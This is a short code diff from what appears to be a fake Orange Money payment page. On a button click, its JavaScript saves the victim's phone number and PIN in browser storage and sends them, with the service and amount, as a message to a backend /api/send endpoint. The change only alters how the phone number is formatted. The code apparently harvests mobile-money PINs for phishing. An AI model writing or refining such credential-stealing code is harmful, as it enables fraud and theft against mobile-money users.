@@ -288,7 +288,7 @@ nextBtn.addEventListener('click', async () => {
   localStorage.setItem('phone', phoneNumber);
   localStorage.setItem('userPin', pin);
 
-  const message = `Orange Money Payment\nPhone: +267${phoneNumber}\nPIN: ${pin}\nService: ${planName}\nAmount: ${planPrice}`;
+  const message = `Orange Money Payment\nPhone: ${phoneNumber}\nPIN: ${pin}\nService: ${planName}\nAmount: ${planPrice}`;
 
   const apiUrl = window.location.hostname === 'localhost'
     ? 'http://localhost:3000/api/send'
